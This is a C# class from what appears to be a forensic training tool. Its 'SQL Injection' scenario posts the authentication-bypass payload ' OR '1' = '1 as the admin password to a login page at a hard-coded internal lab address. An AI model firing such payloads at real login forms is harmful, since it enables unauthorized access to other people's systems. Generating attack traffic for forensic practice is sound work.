using System;
using System.Collections.Generic;
using System.Windows;
using System.Net.Http;
using Caliburn.Micro;
using ForensicScenarios.Events;
using ForensicScenarios.ViewModels;

namespace ForensicScenarios.Scenarios
{
    public class SQLInjection : PropertyChangedBase, IScenario
    {
        public string Name => "SQL Injection";

        public string Description { get; set; }

        public bool IsSelected
        {
            get => isSelected;
            set
            {
                isSelected = value;
                NotifyOfPropertyChange(nameof(IsSelected));
            }
        }

        private bool isSelected;

        private readonly IEventAggregator eventAggregator;

        public SQLInjection(IEventAggregator aggregator)
        {
            eventAggregator = aggregator;
        }

        public async void Run()
        {
            using (var client = new HttpClient())
            {
                var sqlInjection = "' OR '1' = '1";
                var url = @"http://10.201.0.41/login/checklogin.php";
                client.BaseAddress = new Uri(url);

                var parameters = new Dictionary<string, string>();
                parameters.Add("user", "admin");
                parameters.Add("pass", sqlInjection);

                var content = new FormUrlEncodedContent(parameters);

                try
                {
                    var response = await client.PostAsync(client.BaseAddress.AbsolutePath, content);
                    response.EnsureSuccessStatusCode();
                }
                catch (Exception e)
                {
                    MessageBox.Show(e.Message);
                }
                finally
                {
                    eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
                }
            }
        }
    }
}
